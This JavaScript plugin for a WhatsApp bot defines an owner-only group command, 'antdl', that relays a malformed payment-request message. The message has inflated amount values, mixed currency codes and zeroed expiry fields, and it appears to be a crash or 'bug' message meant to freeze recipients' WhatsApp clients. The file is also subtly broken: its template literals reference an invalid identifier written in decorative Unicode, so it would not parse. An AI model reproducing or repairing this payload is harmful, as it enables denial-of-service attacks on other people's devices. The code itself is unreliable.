let handler = async (m, {
   conn,
   text,
   command,
   usedPrefix
}) => {
   const client = conn;

   const noteText = (text || '').trim() || '𝕲𝖔𝖏𝖔 S𝖆𝖙𝖔𝖗𝖚';
   const nour = '𝕲𝖔𝖏𝖔 S𝖆𝖙𝖔𝖗𝖚';

   try {
      await client.relayMessage(
         m.chat,
         {
            requestPaymentMessage: {
               currencyCodeIso4217: "MAD",
               amount1000: {
                  low: 276447232,
                  high: 23283,
                  unsigned: true
               },
               requestFrom: `${𝕲𝖔𝖏𝖔 S𝖆𝖙𝖔𝖗𝖚}@s.whatsapp.net`,
               noteMessage: {
                  extendedTextMessage: {
                     text: noteText,
                     contextInfo: { mentionedJid: [] }
                  }
               },
               expiryTimestamp: {
                  low: 0,
                  high: 0,
                  unsigned: false
               },
               amount: {
                  value: {
                     low: 276447232,
                     high: 23283,
                     unsigned: false
                  },
                  offset: 1000,
                  currencyCode: "IDR"
               },
               contextInfo: {
                  mentionedJid: [],
                  participant: `${𝕲𝖔𝖏𝖔 S𝖆𝖙𝖔𝖗𝖚}@s.whatsapp.net`
               }
            }
         },
         {
            messageId: (client.generateMessageIDV2 && typeof client.generateMessageIDV2 === 'function')
               ? client.generateMessageIDV2(m.chat)
               : "Luffy-" + Date.now().toString(36).toUpperCase()
         }
      );

      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
   } catch (e) {
      client.reply(m.chat, String(e?.stack || e), m);
   }
}

handler.help = ['𝕲𝖔𝖏𝖔 S𝖆𝖙𝖔𝖗𝖚']
handler.tags = ['𝕲𝖔𝖏𝖔 S𝖆𝖙𝖔𝖗𝖚']
handler.command = ['antdl']
handler.owner = true
handler.group = true
handler.admin = false
handler.limit = false

export default handler